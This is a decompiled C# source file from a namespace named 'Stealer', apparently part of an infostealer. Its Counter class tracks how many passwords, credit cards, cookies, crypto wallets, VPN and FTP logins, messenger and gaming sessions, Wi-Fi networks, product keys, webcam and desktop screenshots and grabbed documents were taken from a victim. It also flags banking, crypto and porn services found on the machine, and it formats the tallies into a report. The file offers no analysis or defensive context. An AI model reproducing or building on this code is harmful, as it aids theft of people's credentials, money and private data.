using System;
using System.Collections.Generic;

namespace Stealer
{
	// Token: 0x02000013 RID: 19
	internal sealed class Counter
	{
		// Token: 0x06000065 RID: 101 RVA: 0x00003EB8 File Offset: 0x000020B8
		public static string GetSValue(string application, bool value)
		{
			return value ? ("\r\n   ∟ " + application) : "";
		}

		// Token: 0x06000066 RID: 102 RVA: 0x00003EEC File Offset: 0x000020EC
		public static string GetIValue(string application, int value)
		{
			return (value != 0) ? ("\r\n   ∟ " + application + ": " + value.ToString()) : "";
		}

		// Token: 0x06000067 RID: 103 RVA: 0x00003F2C File Offset: 0x0000212C
		public static string GetLValue(string application, List<string> value, char separator = '∟')
		{
			value.Sort();
			return (value.Count != 0) ? string.Concat(new string[]
			{
				"\r\n   ∟ ",
				application,
				":\r\n\t\t\t\t\t\t\t",
				separator.ToString(),
				" ",
				string.Join("\r\n\t\t\t\t\t\t\t" + separator.ToString() + " ", value)
			}) : ("\r\n   ∟ " + application + " (No data)");
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00003FBC File Offset: 0x000021BC
		public static string GetBValue(bool value, string success, string failed)
		{
			return value ? ("\r\n   ∟ " + success) : ("\r\n   ∟ " + failed);
		}

		// Token: 0x0400004D RID: 77
		public static int Passwords = 0;

		// Token: 0x0400004E RID: 78
		public static int CreditCards = 0;

		// Token: 0x0400004F RID: 79
		public static int AutoFill = 0;

		// Token: 0x04000050 RID: 80
		public static int Cookies = 0;

		// Token: 0x04000051 RID: 81
		public static int History = 0;

		// Token: 0x04000052 RID: 82
		public static int Bookmarks = 0;

		// Token: 0x04000053 RID: 83
		public static int Downloads = 0;

		// Token: 0x04000054 RID: 84
		public static int VPN = 0;

		// Token: 0x04000055 RID: 85
		public static int Pidgin = 0;

		// Token: 0x04000056 RID: 86
		public static int Wallets = 0;

		// Token: 0x04000057 RID: 87
		public static int FTPHosts = 0;

		// Token: 0x04000058 RID: 88
		public static bool Telegram = false;

		// Token: 0x04000059 RID: 89
		public static bool Steam = false;

		// Token: 0x0400005A RID: 90
		public static bool Uplay = false;

		// Token: 0x0400005B RID: 91
		public static bool Discord = false;

		// Token: 0x0400005C RID: 92
		public static int SavedWifiNetworks = 0;

		// Token: 0x0400005D RID: 93
		public static bool ProductKey = false;

		// Token: 0x0400005E RID: 94
		public static bool DesktopScreenshot = false;

		// Token: 0x0400005F RID: 95
		public static bool WebcamScreenshot = false;

		// Token: 0x04000060 RID: 96
		public static int GrabberDocuments = 0;

		// Token: 0x04000061 RID: 97
		public static int GrabberSourceCodes = 0;

		// Token: 0x04000062 RID: 98
		public static int GrabberDatabases = 0;

		// Token: 0x04000063 RID: 99
		public static int GrabberImages = 0;

		// Token: 0x04000064 RID: 100
		public static bool BankingServices = false;

		// Token: 0x04000065 RID: 101
		public static bool CryptoServices = false;

		// Token: 0x04000066 RID: 102
		public static bool PornServices = false;

		// Token: 0x04000067 RID: 103
		public static List<string> DetectedBankingServices = new List<string>();

		// Token: 0x04000068 RID: 104
		public static List<string> DetectedCryptoServices = new List<string>();

		// Token: 0x04000069 RID: 105
		public static List<string> DetectedPornServices = new List<string>();
	}
}
